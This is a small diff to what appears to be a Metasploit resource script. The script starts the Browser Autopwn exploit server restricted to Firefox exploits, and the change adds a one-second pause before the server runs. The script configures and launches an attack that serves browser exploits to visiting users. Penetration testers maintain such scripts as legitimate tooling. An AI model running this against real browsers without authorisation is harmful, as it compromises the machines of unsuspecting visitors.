@@ -1,8 +1,12 @@
 <ruby>
+sleep_time = 1
 print_status("Starting Browser Autopwn with Firefox-only BrowserExploitServer-based exploits.")
 print_status("Older Firefox exploits don't use BES, therefore will not be loaded.")
 run_single("use exploit/multi/browser/autopwn")
 run_single("set Include (mozilla_firefox|firefox)_")
 run_single("set RealList true")
+print_status("Sleeping for #{sleep_time} second(s)")
+sleep(sleep_time)
+print_status("Resuming...")
 run_single("run")
 </ruby>
